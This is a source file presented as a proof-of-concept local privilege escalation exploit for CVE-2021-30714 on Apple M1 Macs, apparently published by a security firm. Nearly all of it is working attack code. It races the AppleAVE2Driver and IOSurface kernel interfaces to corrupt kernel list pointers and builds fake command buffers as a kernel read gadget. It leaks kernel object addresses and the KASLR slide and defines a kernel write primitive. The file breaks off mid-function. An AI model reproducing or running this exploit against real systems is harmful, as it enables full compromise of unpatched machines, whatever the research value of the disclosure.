// CVE-2021-30714 LPE POC on Apple M1 Macbook Air, tested 11.2.1
// By 08tc3wbb. January 2021
"// (C)
// For educational purposes only. Use at your own risk. No warranty or liability on this code.
// ZecOps Mobile XDR - www.zecops.com"

#import <Foundation/Foundation.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/thread_status.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/dyld_images.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include <pthread/pthread.h>
#include <copyfile.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <bootstrap.h>
#include <pthread/pthread.h>

io_connect_t surface_ioconn;
io_connect_t ave_ioconn;
io_connect_t ave_ioconn2;

uint32_t InitInfo_surfaceId;

io_connect_t Open_IOKit_service(const char *serv_name){
    uint32_t ioserv = IOServiceGetMatchingService(0, IOServiceMatching(serv_name));
    if(ioserv == 0){
        printf("Error: %s IOKit service couldn't find\n", serv_name);
        exit(1);
    }
    io_connect_t ioconn = 0;
    IOServiceOpen(ioserv, mach_task_self(), 0, &ioconn);
    if(ioconn == 0){
        printf("Error: %s IOKit service failed to open\n", serv_name);
        exit(1);
    }
    return ioconn;
}

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

uint32_t IOSurfaceRootUserClient_create_surface_map(uint64_t *remote_map_addr, uint32_t *remote_map_size){
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x400000,
        0x0,
    };
    
    size_t output_stru_size = 0xF60; // A fixed size
    char *output_stru = calloc(1, output_stru_size);
    int kr = IOConnectCallStructMethod(surface_ioconn, 0, dict_create, sizeof(dict_create), output_stru, &output_stru_size);
    if(kr){
        printf("IOSurfaceRootUserClient_create_surface_map return error kr: 0x%x\n", kr);
        exit(1);
    }
    if(!kr){
        uint64_t ret_addr1 = *(uint64_t*)output_stru;
        uint32_t ret_addr1_size = *(uint32_t*)(output_stru + 0x1C); // Must be uint32_t length here
        
        *remote_map_addr = ret_addr1;
        *remote_map_size = ret_addr1_size;
        
        return *(uint32_t*)(output_stru+0x18); //Output: Surface ID
    }
    return 0;
}

uint32_t IOSurfaceRootUserClient_create_surface_map22(uint64_t *remote_map_addr, uint32_t *remote_map_size){
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x40000, //Need be equal or greater than 0x25BA8 ref: AVE ERROR: IOSurfaceBufferInitInfo->Size() bad
        0x0,
    };
    
    size_t output_stru_size = 0xF60; // A fixed size
    char *output_stru = calloc(1, output_stru_size);
    int kr = IOConnectCallStructMethod(surface_ioconn, 0, dict_create, sizeof(dict_create), output_stru, &output_stru_size);
    if(kr){
        printf("IOSurfaceRootUserClient_create_surface_map return error kr: 0x%x\n", kr);
        exit(1);
    }
    if(!kr){
        uint64_t ret_addr1 = *(uint64_t*)output_stru;
        uint32_t ret_addr1_size = *(uint32_t*)(output_stru + 0x1C); // Must be uint32_t length here
        
        *remote_map_addr = ret_addr1;
        *remote_map_size = ret_addr1_size;
        
        return *(uint32_t*)(output_stru+0x18); //Output: Surface ID
    }
    return 0;
}

void IOSurfaceRootUserClient_remove_surface_map(uint32_t surfaceId){
    // Release the surface
    uint64_t input_sca = surfaceId;
    IOConnectCallScalarMethod(surface_ioconn, 1, &input_sca, 1, NULL, NULL);
}

uint8_t add_new_client(){
    size_t input_stru_size = 0x90;
    char input_stru[0x90] = {0};
    *(uint32_t*)input_stru = 0x0; // pIn->codecType < AVE_VIDEO_CODEC_MAX
    size_t output_stru_size = 0x8;
    uint32_t output_stru[2] = {0}; // Contain clientbuf->UniqueClientID
    int kr = IOConnectCallStructMethod(ave_ioconn, 0, &input_stru, input_stru_size, output_stru, &output_stru_size);
    // For: AVE ERROR: FindUserClientInfo EnqueueGated failed
    printf("  AVE AddClient kr: 0x%x(%d) clientid:0x%x|0x%x\n", kr, kr, output_stru[0], output_stru[1]);
    if(kr){
        printf("client full\n");
        return 1;
    }
    return 0;
}

uint8_t add_new_client2(){
    size_t input_stru_size = 0x90;
    char input_stru[0x90] = {0};
    *(uint32_t*)input_stru = 0x0; // pIn->codecType < AVE_VIDEO_CODEC_MAX
    size_t output_stru_size = 0x8;
    uint32_t output_stru[2] = {0}; // Contain clientbuf->UniqueClientID
    int kr = IOConnectCallStructMethod(ave_ioconn2, 0, &input_stru, input_stru_size, output_stru, &output_stru_size);
    // For: AVE ERROR: FindUserClientInfo EnqueueGated failed
    printf("  AVE AddClient kr: 0x%x(%d) clientid:0x%x|0x%x\n", kr, kr, output_stru[0], output_stru[1]);
    if(kr){
        printf("client full\n");
        return 1;
    }
    return 0;
}

void remove_client(){
    size_t input_stru_size = 0x4;
    uint32_t unused1 = 0;
    size_t output_stru_size = 0x4;
    uint32_t unused2 = 0;
    IOConnectCallStructMethod(ave_ioconn, 1, &unused1, input_stru_size, &unused2, &output_stru_size);
    // Neither output_stru or kr has used for indicates any sign of success or failure
}

void remove_client2(){
    size_t input_stru_size = 0x4;
    uint32_t unused1 = 0;
    size_t output_stru_size = 0x4;
    uint32_t unused2 = 0;
    IOConnectCallStructMethod(ave_ioconn2, 1, &unused1, input_stru_size, &unused2, &output_stru_size);
    // Neither output_stru or kr has used for indicates any sign of success or failure
}


char *inputmap_InitInfo = NULL;

uint8_t _async_func2_semaphore = 0;
void async_func2(){
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1080);  // 11.4!
    for(int i=0;i<100;i++){
        *alert1 = 0;
    }
    uint32_t *target_value1 = (uint32_t*)(inputmap_InitInfo + 168); // 11.4!
    for(int i=0;i<100;i++){
        *target_value1 = 0;
    }
    
    uint32_t findv = 0xffffffff;
    void *res = memmem(inputmap_InitInfo, 665000, &findv, 4);
    uint64_t old_res = res;
    printf("old res: 0x%llx\n", old_res);
    
    
    
    _async_func2_semaphore = 1; // Semaphore: Ready
    
    while(1){
        void *res = memmem(inputmap_InitInfo, 665000, &findv, 4);
        if(res != old_res){
            printf("new res!: 0x%llx\n", res);
            break;
        }
    }
    
    while(!*target_value1){}
    printf("NEWWW!: 0x%x\n", *target_value1);
    
    while(!*alert1){
        *target_value1 = 0;
    }
    *target_value1 = -19675;
}

uint32_t lowerpart = 0;
uint64_t inputmap_InitInfo_inKernel = 0;

struct psNode{
    // Size: 16
    uint64_t psNode_prev; // psPrev
    uint64_t psNode_next;
};

struct cmdbuf{
    // Size: 56 (0x38)
    struct psNode nodeList; // contains prev/next ptr
    uint64_t sth_from_clientbuf; // +16 // Was loaded from *(_QWORD *)(clientbuf + 158760);
    uint32_t cmd_selector; // +24 // passengerType
    char pad[20];
    uint64_t inputmap_FrameInfo; // +48
};

volatile struct ipc_port {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    // Above stru members are pretty stable across versions, below is not, plz pay attenion to change
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
};

void setup_fake_cmdbuf(void *ptr, uint64_t input_psNode_next, uint64_t addr_intented_to_read){
    // Create a fake cmdbuf
    
    struct cmdbuf *hhh = (struct cmdbuf*)ptr;
    bzero(hhh, sizeof(struct cmdbuf));
    hhh->nodeList.psNode_prev = 0;
    hhh->nodeList.psNode_next = input_psNode_next;
    hhh->cmd_selector = 13; // Levergage AppleAVE2Driver::PreInitCreateContext to read *(uint32_t*)(inputmap_FrameInfo_1 + 4)
    hhh->inputmap_FrameInfo = addr_intented_to_read - 4;
}

uint64_t clientbuf_kAddr = 0;
uint64_t auth_nodeList_prev = 0; // = clientbuf_kAddr + 0x26C48 // To stop the cmdbuf iteration

uint8_t _async_func2_overwrite_clientbuf_psNode2_semaphore = 0;
void async_func2_overwrite_clientbuf_psNode2(){
    // Overwrite target: struct psNode clientbuf_psNode_2 -> psNode_next // +158800 (0x26C50)
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    for(int i=0;i<100;i++){
        *alert1 = 0;
    }
    uint32_t *target_value1 = (uint32_t*)(inputmap_InitInfo + 168);
    for(int i=0;i<100;i++){
        *target_value1 = 0;
    }
    
    _async_func2_overwrite_clientbuf_psNode2_semaphore = 1; // Semaphore: Ready
    
    while(!*alert1){
        *target_value1 = 0;
    }
    *target_value1 = 0xfffffff1; // -15
    
    *(uint64_t*)(inputmap_InitInfo + 8) = inputmap_InitInfo_inKernel + 0x10000; // Cuz we can only overwrite clientbuf_psNode2 to inputmap_InitInfo, so the first next ptr is located in inputmap_InitInfo + 8, we redirect next ptr from this point
    // And Yes, must setting inputmap_InitInfo + 8 in this pthread func at this timing, otw would trigger panic
    
    // At this point, clientbuf_psNode_2->prev is pointing to inputmap_InitInfo + 0x10000
    // Thus clientbuf_psNode_2->next is pointing to inputmap_InitInfo + 0x10008
    
    // ----
    if(clientbuf_kAddr == 0){
        usleep(10000);
        uint64_t *alert2 = (uint64_t*)(inputmap_InitInfo + 0x10000);
        uint64_t *target_value2 = (uint64_t*)(inputmap_InitInfo + 0x10008); // clientbuf_psNode_2->next
        
        while(!*alert2){
            if(!_async_func2_overwrite_clientbuf_psNode2_semaphore)
                return;
        }
        auth_nodeList_prev = *alert2;
        for(int i=0;i<100;i++){
            *target_value2 = auth_nodeList_prev;
        }
        // Insert auth_nodeList_prev into clientbuf_psNode_2->next to stop the loop
        
        printf("auth_nodeList_prev Leaked: 0x%llx\n", auth_nodeList_prev);
        
        clientbuf_kAddr = auth_nodeList_prev - 0x26C48; // struct psNode clientbuf_psNode_2; // +158792 (0x26C48)
    }
}

uint8_t _async_func2_test_semaphore = 0;
void async_func2_test(){
    
    uint64_t *alert1 = (uint64_t*)(inputmap_InitInfo + 1096);
    *alert1 = 0;
    
    uint32_t *target_value1 = (uint32_t*)(inputmap_InitInfo + 168);
    for(int i=0;i<100;i++){
        *target_value1 = 0;
    }
    
    _async_func2_test_semaphore = 1; // Ready
    
    while(!*alert1){
        *target_value1 = 0;
        if(!_async_func2_test_semaphore)
            return;
    }
    
    *target_value1 = 6;
}

void printout_leakout(){
    uint32_t *leakout_data = (uint32_t*)(inputmap_InitInfo + 32);
    printf("  leakout_data: 0x%x\n", *leakout_data);
    if(*leakout_data){
        if(!lowerpart){
            lowerpart = *leakout_data;
        }
        else{
            inputmap_InitInfo_inKernel = *leakout_data;
            inputmap_InitInfo_inKernel = inputmap_InitInfo_inKernel * 0x100000000;
            inputmap_InitInfo_inKernel |= lowerpart;
            printf("inputmap_InitInfo_inKernel: 0x%llx\n", inputmap_InitInfo_inKernel);
        }
    }
}

void AppleAVE_cleanup(){
    *(uint64_t*)(inputmap_InitInfo + 5992) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5992) = 0;
    *(uint64_t*)(inputmap_InitInfo + 5992) = 0;
    remove_client();
    remove_client();
    IOSurfaceRootUserClient_remove_surface_map(InitInfo_surfaceId);
}

uint32_t leaked_data_buf[4096] = {0};
uint32_t leaked_data_buf_len = 0;
void leaked_data_buf_reset(){
    for(int i=0; i<4096; i++){
        leaked_data_buf[i] = 0;
    }
    leaked_data_buf_len = 0;
}

uint8_t Kmem_read_gadget_enabled = 0;
void AVE_got_msg(CFMachPortRef port, void *_msg, CFIndex size, void *info){
    // Callback function from AppleAVE2UserClient::SendFrame
    
    struct AVE_Callback_mach_header {
        mach_msg_header_t header;
        char pad[0x4C];
        uint32_t leaked_data; // + 0x64
    };
    
    struct AVE_Callback_mach_header *msg = _msg;
    if(msg->leaked_data == 0x77777777){
        // The default value
        // Invoked during initial mapping and when remove AVE driver userClients
        mach_msg_destroy((mach_msg_header_t*)msg);
        return;
    }
    else if(Kmem_read_gadget_enabled == 1){
        //printf("leaked_data via msg: 0x%x\n", msg->leaked_data);
        leaked_data_buf[leaked_data_buf_len] = msg->leaked_data;
        leaked_data_buf_len ++;
    }
    else if(msg->leaked_data == 13){
        // First leaked data is from  hhh->cmd_selector = 13; // Levergage AppleAVE2Driver::PreInitCreateContext
        // We got the loop-stop kptr now, mark the read gadget as working.
        
        //printf("*leaked_data via msg: %d\n", msg->leaked_data);
    }
    
    mach_msg_destroy((mach_msg_header_t*)msg);
}

uint8_t _Setup_Notif_Receive_Kernel_Msgs_semaphore = 0;
void Setup_Notif_Receive_Kernel_Msgs(){
    // Call AppleAVE2UserClient::_SetCallback
    CFMachPortRef _callbackPort = CFMachPortCreate(kCFAllocatorDefault, AVE_got_msg, NULL, NULL);
    CFRunLoopSourceRef _callbackRunloop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, _callbackPort, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), _callbackRunloop, kCFRunLoopDefaultMode);
    
    uint64_t *asyncRef = calloc(1, 8*sizeof(uint64_t));
    asyncRef[kIOAsyncCalloutFuncIndex] = (uint64_t)AVE_got_msg;
    asyncRef[kIOAsyncCalloutRefconIndex] = 0;
    
    uint64_t input_stru[3] = {0};
    input_stru[1] = 1; // completionCallback
    input_stru[2] = 1; // completionRefCon
    
    size_t output_stru_size = 0x4;
    uint32_t output_stru = 0;
    
    int kr = IOConnectCallAsyncMethod(ave_ioconn, 2, CFMachPortGetPort(_callbackPort), asyncRef, kOSAsyncRef64Count, NULL, 0, input_stru, 0x18, NULL, NULL, &output_stru, &output_stru_size);
    if(kr != 0){
        printf("Error: IOConnectCallAsyncMethod return bad kr(0x%x)\n", kr);
        exit(1);
    }
    _Setup_Notif_Receive_Kernel_Msgs_semaphore = 1;
    CFRunLoopRun();
}

void call_preinit_to_send_msg(){
    {
        *(uint32_t*)(inputmap_InitInfo + 4) = 0x43434343;
        
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // 笔记里有记下, Step 1) 先 leak mapped_kaddr 地址 (lower part)
        *(uint32_t*)(inputmap_InitInfo + 24) = 17767 + 1; // FrameInfo->InfoTypes
        
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0; // offset of inputmap_FrameInfo, godamn, cool feature
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint8_t*)(input_stru + 24) = 1; // Enable Timestamp
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        
        int krr = IOConnectCallStructMethod(ave_ioconn, 7, input_stru, 0x28, output_stru, &output_stru_size);
        printf("2nd calling (EncodeFrame clientbuf overwrite) result kr:: 0x%x\n", krr);
    }
}


void Trigger_AppleAVE2_Vuln_Overwriting_ptr(){
    usleep(2*50000);
    {
        _async_func2_overwrite_clientbuf_psNode2_semaphore = 0;
        
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)async_func2_overwrite_clientbuf_psNode2, NULL);
        while(!_async_func2_overwrite_clientbuf_psNode2_semaphore){};
        usleep(50000);
        
        *(uint32_t*)(inputmap_InitInfo + 12) = 0;
        *(uint32_t*)(inputmap_InitInfo + 24) = 17767 + 2;
        
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0; // offset of inputmap_FrameInfo, godamn, cool feature
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint8_t*)(input_stru + 24) = 1; // Enable Timestamp
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        
        int kr = IOConnectCallStructMethod(ave_ioconn, 7, input_stru, 0x28, output_stru, &output_stru_size);
        printf("Triggering Vuln result kr:: 0x%x\n", kr);
        _async_func2_overwrite_clientbuf_psNode2_semaphore = 0;
        pthread_join(ph, NULL);
    }
    usleep(50000);
}

void KernelWrite_8bytes_primi(uint64_t target_addr, uint64_t write_data){
    // Construct kwrite primitive via IOSurfaceRootUserClient::†
    //KHelper_KernelWrite8(IOSurfaceRootUserClient_obj_kAddr + 280, inputmap_InitInfo_inKernel + 0x8000);
    
    // Note: write_data must be something, it can not be 0
    *(uint64_t*)(inputmap_InitInfo + 0x8008) = inputmap_InitInfo_inKernel + 0x8008;
    *(uint64_t*)(inputmap_InitInfo + 0x8048) = inputmap_InitInfo_inKernel + 0x8008; // +856
    *(uint64_t*)(inputmap_InitInfo + 0x8360) = target_addr - 16; // target addr - 16
    
    uint64_t input[4] = {1, 0, 0, write_data};
    IOConnectCallScalarMethod(surface_ioconn, 45, input, 4, NULL, NULL);
}

int main(int argc, const char * argv[]) {

    system("/usr/bin/nohup /usr/bin/log show > /dev/null 2>&1 &"); // This increases success rate
    system("/usr/bin/nohup /usr/bin/log show > /dev/null 2>&1 &");
    
    printf("uid: %d\n", getuid());
    
    printf("Start pwning M1 laptop...\n");
    
    surface_ioconn = Open_IOKit_service("IOSurfaceRoot");
    ave_ioconn = Open_IOKit_service("AppleAVE2Driver");
    ave_ioconn2 = Open_IOKit_service("AppleAVE2Driver");
    
    printf("IOKit services opened successfully:\n");
    printf("  surface_ioconn: 0x%x\n", surface_ioconn);
    printf("  ave_ioconn: 0x%x\n", ave_ioconn);
    printf("  ave_ioconn2: 0x%x\n", ave_ioconn2);
    
    printf("Setting up notif port to receive kernel messages...\n");
    {
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)Setup_Notif_Receive_Kernel_Msgs, NULL);
        while(!_Setup_Notif_Receive_Kernel_Msgs_semaphore){};
    }
    
    uint64_t InitInfo_map_addr = 0, InitInfo_map_size = 0;
    InitInfo_surfaceId = IOSurfaceRootUserClient_create_surface_map(&InitInfo_map_addr, (uint32_t*)&InitInfo_map_size);
    
    printf("InitInfo_surfaceId: 0x%x\n", InitInfo_surfaceId);
    printf("InitInfo_map_addr: 0x%llx size: 0x%llx\n", InitInfo_map_addr, InitInfo_map_size);
    
    inputmap_InitInfo = (char*)InitInfo_map_addr;
    
    add_new_client();
    
    *(uint32_t*)(inputmap_InitInfo + 13532) = 0; // AVE_Client_CheckCodecInfo // 11.4!
    *(uint32_t*)(inputmap_InitInfo + 14320) = 2; // AVE_CheckChromaFmt(*(unsigned int *)(mapped_kaddr + 14336)) // Must < 4 // 11.4!
    
    // Fix of AVE ERR: AVE_AVC_CheckInfo: res frame dimension is not out of range 0 0
    *(uint32_t*)(inputmap_InitInfo + 2020) = 0xC0; // 11.4!
    *(uint32_t*)(inputmap_InitInfo + 2024) = 0x60; // 11.4!
    
    // Fix of AVE_Client_CheckCommonInfo: pInfo->VideoParamsDriver.SlicesPerFrame && pInfo->VideoParamsDriver.SlicesPerFrame <= 32 slice number is out of range
    *(uint32_t*)(inputmap_InitInfo + 13508) = 0x20; // 11.4!
    *(uint32_t*)(inputmap_InitInfo + 13444) = 0; // 11.4!
    
    // Fix of AVE ERR: EnqueueGated:7496 false FrameInfo->InfoType not recognized (0x0)
    *(uint32_t*)(inputmap_InitInfo + 24) = 17767 + 4; // FrameInfo->InfoType // 11.4!
    
    // AppleAVE2Driver::ProcessInput`if ( clientbuf_1->flag_skipCmd )
    *(uint8_t*)(inputmap_InitInfo + 159170) = 1; // 11.4!
    
    *(uint32_t*)(inputmap_InitInfo + 12) = 1;
    

    *(uint32_t*)(inputmap_InitInfo + 13448) = 1; // Enable Time-stamp for FrameInfo +1088 and +1096 AppleAVE2Driver::ProcessReadyCmd // 11.4!
    
    *(uint32_t*)(inputmap_InitInfo + 13452) = 1; // Enable Callback (::SendFrame) calling
    
    *(uint32_t*)(inputmap_InitInfo + 1936) = 0;
    // ::IMG_V_EncodeAndSendFrame
    // if ( *(_DWORD *)&clientbuf_1->inputmap_InitInfo_block4[344] )
    // It's for leak 32-bits pointer
    
    *(uint32_t*)(inputmap_InitInfo + 28) = 1;
    // ::IMG_V_EncodeAndSendFrame
    // if ( !*(_DWORD *)&clientbuf_1->inputmap_InitInfo_block3[28] )
    // It's for leak 32-bits pointer
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 39;
    // ::IMG_V_EncodeAndSendFrame
    // v53 = *(_DWORD *)&clientbuf_1->inputmap_InitInfo_block3[96];
    // Avoid ::IMG_V_EncodeAndSendFrame touching clientbuf->StreamingERC
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 0x77777777;
    // Init identifier for kernel msg
    
    *(uint32_t*)(inputmap_InitInfo + 13576) = 0;
    
    {
        char input_stru[0x100] = {0};
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 16) = InitInfo_surfaceId;
       
        *(uint32_t*)(input_stru + 244) = 1;
        // Fix AVE_Client_CheckCommonInfo
        //  v8 = *(_DWORD *)(mapped_kaddr + 13452);
        //  if ( v8 != 1 || a2 & 1 ) // a2 is from input_stru + 244
        
        size_t output_stru_size = 4;
        char output_stru[4] = {0};
        int kr = IOConnectCallStructMethod(ave_ioconn, 3, input_stru, 0x100, output_stru, &output_stru_size);
        printf("1st calling (PreInit) result kr: 0x%x\n", kr);
    }
    
    printf("Going to make the 2nd call...\n");
    usleep(50000);
    sleep(1);
    
    {
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)async_func2, NULL);
        while(!_async_func2_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 12) = 0;
        *(uint32_t*)(inputmap_InitInfo + 24) = 17767 + 1; // FrameInfo->InfoTypes
        
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint8_t*)(input_stru + 24) = 1; // Enable Timestamp
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        
        int krr = IOConnectCallStructMethod(ave_ioconn, 7, input_stru, 0x28, output_stru, &output_stru_size);
        printf("2nd calling (EncodeFrame clientbuf overwrite) result kr:: 0x%x\n", krr);
        
        _async_func2_semaphore = 0;
        pthread_join(ph, NULL);
    }
    
    printf("Checking leakdata (part 1):\n");
    printout_leakout();
    if(lowerpart == 0){
        printf("BAD racin.. exiting\n");
        AppleAVE_cleanup();
        exit(1);
    }
    
    return 0;
    
    {
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)async_func2, NULL);
        while(!_async_func2_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 12) = 1;
        *(uint32_t*)(inputmap_InitInfo + 24) = 17767 + 2; // FrameInfo->InfoTypes
        
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint8_t*)(input_stru + 24) = 1; // Enable Timestamp
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        
        int krr = IOConnectCallStructMethod(ave_ioconn, 7, input_stru, 0x28, output_stru, &output_stru_size);
        printf("2nd calling (EncodeFrame clientbuf overwrite) result kr:: 0x%x\n", krr);
        
        _async_func2_semaphore = 0;
        pthread_join(ph, NULL);
    }
    
    printf("Checking leakdata (part 2):\n");
    printout_leakout();
    
    if(inputmap_InitInfo_inKernel == 0){
        printf("BAD racin.. exiting\n");
        AppleAVE_cleanup();
        exit(1);
    }
    
    printf("Going to make the 3rd call (Overwriting clientbuf_psNode_2)...\n");
    usleep(50000);
    
    {
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000, inputmap_InitInfo_inKernel + 0x10000, inputmap_InitInfo_inKernel + 0x10000 + offsetof(struct cmdbuf, cmd_selector));
        // Creating a inf loop
        Trigger_AppleAVE2_Vuln_Overwriting_ptr();
    }
    
    while(!clientbuf_kAddr){};
    printf("clientbuf kAddr Leaked: 0x%llx\n", clientbuf_kAddr);
    
    Kmem_read_gadget_enabled = 1;
    printf("Kernel Read Gadget Enabled\n");
    
    printf("going to next stage...\n");
    usleep(50000);
    
    leaked_data_buf_reset();
    {
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000, inputmap_InitInfo_inKernel + 0x10000 + sizeof(struct cmdbuf), clientbuf_kAddr + 16);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + sizeof(struct cmdbuf), auth_nodeList_prev, clientbuf_kAddr + 20);
        Trigger_AppleAVE2_Vuln_Overwriting_ptr();
    }
    
    while(leaked_data_buf_len < 2){};
    
    uint64_t AppleAVE2UserClient_obj_kAddr = leaked_data_buf[1];
    AppleAVE2UserClient_obj_kAddr *= 0x100000000;
    AppleAVE2UserClient_obj_kAddr |= leaked_data_buf[0];
    printf("AppleAVE2UserClient obj kAddr Leaked: 0x%llx\n", AppleAVE2UserClient_obj_kAddr);
    
    leaked_data_buf_reset(); // DO NOT forget to reset leaked data after use
    
    printf("gonna test the 2nd time\n");
    usleep(50000);
    
    // Use read gadget to read out AppleAVE2Driver obj and task stru (they are part of the AppleAVE2UserClient obj)
    // void *v;
    // AppleAVE2Driver *provider; // AppleAVE2UserClient+216 // m_pcDriver
    // void *owningTask; // AppleAVE2UserClient+232
    {
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000, inputmap_InitInfo_inKernel + 0x10000 + sizeof(struct cmdbuf), AppleAVE2UserClient_obj_kAddr + 216);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 2*sizeof(struct cmdbuf), AppleAVE2UserClient_obj_kAddr + 220);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 2*sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 3*sizeof(struct cmdbuf), AppleAVE2UserClient_obj_kAddr + 232);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 3*sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 6*sizeof(struct cmdbuf), AppleAVE2UserClient_obj_kAddr + 236);
        // 用了 4*sizeof(struct cmdbuf) 会 panic
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 6*sizeof(struct cmdbuf), auth_nodeList_prev, AppleAVE2UserClient_obj_kAddr);
        Trigger_AppleAVE2_Vuln_Overwriting_ptr();
    }
    
    while(leaked_data_buf_len < 5){};
    uint64_t AppleAVE2Driver_obj_kAddr = leaked_data_buf[1];
    AppleAVE2Driver_obj_kAddr *= 0x100000000;
    AppleAVE2Driver_obj_kAddr |= leaked_data_buf[0];
    printf("AppleAVE2Driver obj kAddr Leaked: 0x%llx\n", AppleAVE2Driver_obj_kAddr);
    
    uint64_t our_task_kAddr = leaked_data_buf[3];
    our_task_kAddr *= 0x100000000;
    our_task_kAddr |= leaked_data_buf[2];
    printf("our task stru kAddr Leaked: 0x%llx\n", our_task_kAddr);
    
    printf("AppleAVE2UserClient obj vtable: 0x%x\n", leaked_data_buf[4]);
    uint32_t kaslr = leaked_data_buf[4] - 0x1B9170 - 0xaa70000;
    printf("kaslr: 0x%x\n", kaslr);
    
    return 0;
    
    leaked_data_buf_reset();
    
    {
        mach_port_t stored_ports[3] = {0};
        stored_ports[2] = surface_ioconn; // task + 0x328
        mach_ports_register(mach_task_self(), stored_ports, 3);
    }
    
    // ---- Another kmem read
    usleep(50000);
    {
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000, inputmap_InitInfo_inKernel + 0x10000 + sizeof(struct cmdbuf), our_task_kAddr + 0x328);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 2*sizeof(struct cmdbuf), our_task_kAddr + 0x328 + 4);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 2*sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 3*sizeof(struct cmdbuf), AppleAVE2Driver_obj_kAddr + 584);
        setup_fake_cmdbuf(inputmap_InitInfo + 0x10000 + 3*sizeof(struct cmdbuf), inputmap_InitInfo_inKernel + 0x10000 + 6*sizeof(struct cmdbuf), AppleAVE2Driver_obj_kAddr + 584 + 4);
